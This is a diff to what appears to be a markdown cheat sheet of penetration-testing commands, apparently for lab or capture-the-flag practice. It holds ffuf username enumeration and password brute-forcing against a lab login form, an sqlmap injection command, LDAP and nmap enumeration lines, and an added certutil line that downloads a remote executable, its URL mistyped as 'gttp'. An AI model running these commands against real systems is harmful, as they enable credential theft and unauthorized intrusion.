@@ -24,11 +24,13 @@ List of tools/resources for Cybersecurity
     - ``` ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.134.222/customers/signup -mr "username already exists" ```
     - ``` ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.134.222/customers/login -fc 200 ```
   - ```sqlmap -u "http://example.com/login.php" --data "username=admin&password=test" --dbs```
+  - ```ldapsearch -x -h 10.10.10.25 -b "(objectclass=user)" | grep sAMAccountName```
+  - ```nmap --script ldap-rootdse 10.10.10.0/24```
+  - ```certutil.exe -urlcache -split -f "gttp://pstools.exe" pstools.exe```
   - PHP Filter Chaining (https://github.com/synacktiv/php_filter_chain_generator/tree/main)
     - How to use? https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/
   - sudo mount -t cifs //target-IP/cyberq /mnt/cyberq -o guest
-  - ```ldapsearch -x -h 10.10.10.25 -b "(objectclass=user)" | grep sAMAccountName```
-  - ```nmap --script ldap-rootdse 10.10.10.0/24```
+
   - knockpy To discover subdomains
 
 ### SSRF, RCE, XXE, LFI Helpers
